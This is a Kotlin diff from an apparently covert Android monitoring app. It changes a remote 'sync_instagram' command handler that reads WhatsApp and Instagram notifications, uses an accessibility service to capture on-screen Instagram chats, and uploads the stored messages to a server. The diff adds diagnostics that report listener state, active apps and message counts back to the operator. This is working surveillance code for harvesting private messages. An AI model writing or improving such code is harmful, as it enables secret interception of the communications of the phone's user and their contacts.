@@ -100,13 +100,27 @@ class SyncRunner(private val context: Context) {
         }
         commands.filter { it.command_type == "sync_instagram" }.forEach { command ->
             try {
-                com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
-                com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
+                val notifInst = com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance
+                val a11yInst = com.spapp.monitoring.blocking.BlockAccessibilityService.instance
+                val activeNotifs = notifInst?.activeNotifications
+                val activePkgs = activeNotifs?.mapNotNull { it.packageName }?.distinct() ?: emptyList()
+                val igNotifs = activeNotifs?.filter { it.packageName == "com.instagram.android" }?.size ?: 0
+
+                notifInst?.processAllActiveNotifications()
+                a11yInst?.let { service ->
                     service.recordInstagramChatIfForeground(service.rootInActiveWindow)
                 }
-                syncInstagramMessages(bearer, AppDatabase.getInstance(context))
-                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "Instagram sync triggered"))
-            } catch (_: Exception) {}
+                val db = AppDatabase.getInstance(context)
+                val unsyncedCount = db.instagramMessageDao().getUnsynced().size
+                val totalDbCount = db.instagramMessageDao().count()
+
+                syncInstagramMessages(bearer, db)
+
+                val diagMsg = "ListenerOn=${notifInst != null}, A11yOn=${a11yInst != null}, ActivePkgs=$activePkgs, IgNotifCount=$igNotifs, DbTotal=$totalDbCount, Unsynced=$unsyncedCount, LastLog=${com.spapp.monitoring.collectors.WhatsAppNotificationListener.lastDebugLog}"
+                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = diagMsg))
+            } catch (e: Exception) {
+                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = false, message = "Error: ${e.message}"))
+            }
         }
         com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
         com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
